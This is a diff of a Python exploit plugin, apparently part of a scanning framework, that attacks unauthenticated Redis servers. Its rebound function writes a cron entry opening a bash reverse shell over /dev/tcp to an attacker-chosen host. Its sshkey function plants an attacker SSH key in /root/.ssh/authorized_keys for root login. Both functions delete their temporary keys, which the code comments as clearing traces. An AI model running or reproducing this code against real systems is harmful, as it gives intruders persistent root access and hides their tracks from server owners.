@@ -2,29 +2,27 @@
 # -*- coding: utf-8 -*-
 __author__ = 'orleven'
 
-
+import redis
+import time
+import socket
+import random
+from string import ascii_lowercase
 
 def get_script_info(data=None):
     script_info = {
         "name": "reids unauth",
-        "info": "ssh key should be configed",
-        "level": "low",
+        "info": "reids unauth, ssh key should be configed",
+        "level": "high",
         "type": "info",
-        "author": "orleven",
-        "url": "",
-        "keyword": "tag:iis",
-        "source": 1
     }
     return script_info
 
 def prove(data):
-    port = int(data['target_port']) if int(data['target_port']) != 0 else 6379
-    data['target_port'] = port
-    import redis
+    data = init(data,'redis')
     try:
-        r = redis.Redis(data['target_host'], port,socket_connect_timeout=5,socket_timeout=5)
+        r = redis.Redis(data['target_host'], data['target_port'],socket_connect_timeout=data['timeout'],socket_timeout=data['timeout'])
         info = r.info()
-        data['flag'] = True
+        data['flag'] = 1
         data['data'].append({"info": "info"})
         data['res'].append({"info":"The vul is exist!","redis_info": info})
     except :
@@ -32,13 +30,13 @@ def prove(data):
     return data
 
 def rebound(data):
-    port = int(data['target_port']) if int(data['target_port']) != 0 else 6379
-    data['target_port'] = port
-    import redis
+    data = init(data, 'redis')
+
     if 'local_host' not in data.keys() or 'local_post' not in data.keys() :
         raise Exception("None local_host or local_post")
     try:
-        r = redis.Redis(data['target_host'], port,socket_connect_timeout=5,socket_timeout=5)
+        r = redis.Redis(data['target_host'], data['target_port'], socket_connect_timeout=data['timeout'],
+                        socket_timeout=data['timeout'])
         payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(ip=data["local_host"],
                                                                                          port=str(data["local_post"], ))
         path = '/var/spool/cron'
@@ -50,7 +48,7 @@ def rebound(data):
         r.save()
         r.delete(key)  # 清除痕迹
         r.config_set('dir', '/tmp')
-        data['flag'] = True
+        data['flag'] = 1
         data['data'].append({"key": key, "payload": payload, "path": path, "name": name})
         data['res'].append({"info":"Success","local_host": data["local_host"], "local_post": str(data["local_post"])})
     except:
@@ -60,8 +58,7 @@ def rebound(data):
 
 
 def sshkey(data):
-    port = int(data['target_port']) if int(data['target_port']) != 0 else 6379
-    data['target_port'] = port
+    data = init(data, 'redis')
 
     public_key = 'ssh-rsa ====='
 
@@ -74,32 +71,57 @@ def sshkey(data):
         raise Exception("None public_key or private_key")
 
     try:
-
-
-
-        if _test_Connect(data['target_host'], 22,private_key):
-            import redis, time
-            r = redis.Redis(host=data['target_host'], port=port, db=0,socket_connect_timeout=5,socket_timeout=5)
-            if 'redis_version' in r.info():
-                key = _random_string(10)
-                path = '/root/.ssh'
-                name = 'authorized_keys'
-                r.set(key, '\n\n' + public_key + '\n\n')
-                r.config_set('dir', path)
-                r.config_set('dbfilename',name)
-                r.save()
-                r.delete(key)  # 清除痕迹
-                r.config_set('dir', '/tmp')
-                time.sleep(5)
-                if _test_Connect(data['target_host'], 22,private_key):
-                    data['flag'] = True
-                    data['data'].append({"key": key, "public_key": public_key, "path": path, "name": name})
-                    data['res'].append({"info":"Success","local_host": data["local_host"], "local_post": str(data["local_post"])})
+        r = redis.Redis(data['target_host'], data['target_port'], socket_connect_timeout=data['timeout'],
+                        socket_timeout=data['timeout'])
+        if 'redis_version' in r.info():
+            key = _random_string(10)
+            path = '/root/.ssh'
+            name = 'authorized_keys'
+            r.set(key, '\n\n' + public_key + '\n\n')
+            r.config_set('dir', path)
+            r.config_set('dbfilename', name)
+            r.save()
+            r.delete(key)  # 清除痕迹
+            r.config_set('dir', '/tmp')
+            time.sleep(5)
+            if _ssh_connect(data['target_host'], 22, data['timeout'], private_key):
+                data['flag'] = 1
+                data['data'].append({"key": key, "public_key": public_key, "path": path, "name": name})
+                data['res'].append(
+                    {"info": "Success", "local_host": data["local_host"], "local_post": str(data["local_post"])})
     except Exception:
         pass
     return data
 
 
+def _random_string(length=8):
+    return ''.join([random.choice(ascii_lowercase) for _ in range(length)])
+
+def _socket_connect(ip, port,timeout=5,msg = "test"):
+    socket.setdefaulttimeout(timeout)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect(ip, port)
+        s.sendall(bytes(msg, 'utf-8'))
+        message = str(s.recv(1024))
+        s.close()
+        return True
+    except:
+        return False
+
+def _ssh_connect(ip, port=22,timeout = 5,private_key=None):
+    import paramiko
+    from paramiko.ssh_exception import SSHException
+    try:
+        s = paramiko.SSHClient()
+        s.load_system_host_keys()
+        s.connect(ip, port, username='root', pkey=private_key, timeout=timeout)
+        s.close()
+        return True
+    except Exception as e :
+        if type(e) == SSHException:
+            return True
+        return False
 
 # """
 # redis getshell expliot (/var/spool/cron reverse shell)
@@ -127,7 +149,7 @@ def sshkey(data):
 #                 real_url = redirectURL(ip + ':' + str(web_port))
 #             except Exception:
 #                 real_url = ip + ':' + str(web_port)
-#             break  # TODO 这里简单化处理,只返回了一个端口的结果
+#             break  # 这里简单化处理,只返回了一个端口的结果
 #     else:
 #         return False
 #
@@ -167,25 +189,6 @@ def sshkey(data):
 
 
 
-def _random_string(length=8):
-    import random
-    from string import ascii_lowercase
-    return ''.join([random.choice(ascii_lowercase) for _ in range(length)])
-
-
-def _test_Connect(ip, port=22,private_key=None):
-    import paramiko
-    from paramiko.ssh_exception import SSHException
-    try:
-        s = paramiko.SSHClient()
-        s.load_system_host_keys()
-        s.connect(ip, port, username='root', pkey=private_key, timeout=10)
-        s.close()
-        return True
-    except Exception as e :
-        if type(e) == SSHException:
-            return True
-        return False
 
 
 
